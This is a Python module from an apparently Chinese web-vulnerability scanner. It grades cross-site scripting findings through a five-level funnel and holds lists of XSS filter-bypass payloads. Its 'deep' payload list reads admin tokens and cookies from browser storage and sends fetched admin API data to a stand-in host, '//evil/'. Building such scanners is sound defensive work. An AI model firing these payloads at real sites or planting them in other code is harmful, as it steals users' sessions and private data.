"""
core/xss/deep_xss.py — XSS 深挖漏斗 + 量化定级（§2.5 / 技术方案 3.10.2）。

## 为什么需要
玄鉴 `core/xss/scanner.py` + `upload_xss.py` + `browser_engine.py` 已具备基础 XSS
检测与 Playwright 证实。缺 L1–L5 标准漏斗、5 原语、量化定级铁律、深度窃会话 payload。

## 能力
1. `XssFunnel.level()` — L1 注入点存在 → L5 浏览器证实执行（5 级漏斗）
2. `XssFunnel.grade()` — 量化定级：
   - 读回可执行 + 未鉴权 = Critical
   - 未证实执行 = High（而非 Critical，防过度定级）
   - 白名单过宽 = Low
3. `PAYLOAD_DEEP` — 深度窃会话 payload（xindai2 X2-4）：
   读 localStorage 管理员令牌 + fetch 管理端 user/list

## 5 原语（§2.5 XSS 5 原语）
quote_variant / tag_mutation / event_handler / js_encode / double_encode

## 复用
- `core/xss/browser_engine.py` Playwright 证实执行
- `core/xss/scanner.py` 基础 XSS 检测
- `high_critical_gate` 未证实执行只中危

## 零依赖
纯 stdlib；不模块级 import playwright。
"""
from __future__ import annotations

from typing import Any

# XSS 5 原语（§2.5）
XSS_PRIMITIVES = {
    "quote_variant": [
        '<script>alert(1)</script>',
        "<script>alert('1')</script>",
        '<ScRiPt>alert("1")</ScRiPt>',
    ],
    "tag_mutation": [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
    ],
    "event_handler": [
        '" onmouseover=alert(1) x="',
        "' onfocus=alert(1) autofocus x='",
        '"><iframe src=javascript:alert(1)>',
    ],
    "js_encode": [
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        'javascript:alert(1)',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    ],
    "double_encode": [
        '%253Cscript%253Ealert(1)%253C/script%253E',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
    ],
}

# 深度窃会话 payload（xindai2 X2-4）— 定 high 硬条件=浏览器证实执行 + 窃会话
PAYLOAD_DEEP = [
    'localStorage.getItem("adminToken")',
    'localStorage.getItem("token")',
    'fetch("/api/user/profile").then(r=>r.json()).then(d=>document.location="//evil/?d="+JSON.stringify(d))',
    'fetch("/api/admin/users").then(r=>r.text()).then(d=>new Image().src="//evil/?d="+btoa(d))',
    'document.cookie',
    'localStorage.getItem("accessToken")',
    'sessionStorage.getItem("token")',
]


def build_deep_payloads() -> list[str]:
    """构建深度窃会话 payload 列表（xindai2 X2-4）。"""
    return list(PAYLOAD_DEEP)


class XssFunnel:
    """XSS L1–L5 标准漏斗 + 量化定级。

    L1 = 注入点存在（payload 反射在响应中）
    L2 = 上下文正确（在 HTML/JS 可执行位置，非注释/属性转义）
    L3 = payload 可执行（未被过滤/编码致无法执行）
    L4 = 盲打成功（无鉴权情况下 payload 被存储或执行）
    L5 = 浏览器证实执行（Playwright 真实执行 alert/DOM 变化）
    """

    def level(self, payload: str, resp: dict[str, Any]) -> int:
        """根据 payload 与响应判定漏斗层级（1–5）。

        Args:
            payload: 注入的 XSS payload
            resp: 响应 dict，含 body/text/status

        Returns:
            1–5 的层级整数
        """
        body = str(resp.get("body") or resp.get("text") or resp.get("data") or "")
        status = resp.get("http_code") or resp.get("status") or 0
        try:
            status = int(status)
        except (TypeError, ValueError):
            status = 0

        # L1: payload 反射在响应中
        if payload and payload in body:
            pass
        elif payload and self._reflected_variant(payload, body):
            pass
        else:
            return 0  # 未反射

        # L2: 在可执行上下文（非 HTML 注释/转义区域）
        if not self._in_executable_context(payload, body):
            return 1

        # L3: payload 未被编码/过滤致不可执行
        if self._is_encoded(payload, body):
            return 2

        # L4: 盲打（无鉴权也能触发）
        if status == 200:
            return 4

        return 3

    def level_from_browser(self, base_level: int, exec_confirmed: bool) -> int:
        """若浏览器证实执行 → L5。"""
        if exec_confirmed:
            return 5
        return base_level

    def grade(
        self,
        exec_confirmed: bool,
        unauthed_readback: bool,
        whitelist_loose: bool,
    ) -> str:
        """量化定级（§2.5 XSS 量化定级铁律）。

        Args:
            exec_confirmed: 浏览器证实执行（Playwright 真实执行）
            unauthed_readback: 读回可执行 + 未鉴权（无 token 也能触发）
            whitelist_loose: 白名单过宽（CSP/过滤太宽松但仍触发）

        Returns:
            "Critical" / "High" / "Medium" / "Low"
        """
        # 读回可执行 + 未鉴权 + 浏览器证实 → Critical
        if exec_confirmed and unauthed_readback:
            return "Critical"

        # 浏览器证实执行但需鉴权 → High（非 Critical，防过度定级）
        if exec_confirmed:
            return "High"

        # 白名单过宽但仍触发 → Low
        if whitelist_loose:
            return "Low"

        # 未证实执行 → Medium（不升 High）
        return "Medium"

    def _reflected_variant(self, payload: str, body: str) -> bool:
        """payload 变体是否反射在响应中（大小写不敏感/编码变体）。"""
        p_lower = payload.lower()
        b_lower = body.lower()
        if p_lower in b_lower:
            return True
        # 去空格变体
        compact = payload.replace(" ", "").lower()
        if compact and compact in b_lower.replace(" ", ""):
            return True
        return False

    def _in_executable_context(self, payload: str, body: str) -> bool:
        """payload 是否在可执行上下文（非 HTML 注释/JS 字符串转义区域）。"""
        idx = body.find(payload)
        if idx < 0:
            idx = body.lower().find(payload.lower())
        if idx < 0:
            return False
        before = body[:idx]
        # 在 HTML 注释中
        if "<!--" in before and "-->" not in before:
            return False
        # 在 script 字符串内（被引号包裹且前面有转义）
        if before.endswith("\\"):
            return False
        return True

    def _is_encoded(self, payload: str, body: str) -> bool:
        """payload 是否被编码/过滤致不可执行。"""
        if payload not in body:
            return False
        # 检查 payload 周围是否有编码标记
        idx = body.find(payload)
        after = body[idx + len(payload):idx + len(payload) + 10]
        # 被实体编码
        if "&lt;" in body[idx:idx + len(payload) + 4]:
            return True
        if "&gt;" in after[:4]:
            return True
        return False


__all__ = [
    "XssFunnel",
    "XSS_PRIMITIVES",
    "PAYLOAD_DEEP",
    "build_deep_payloads",
]
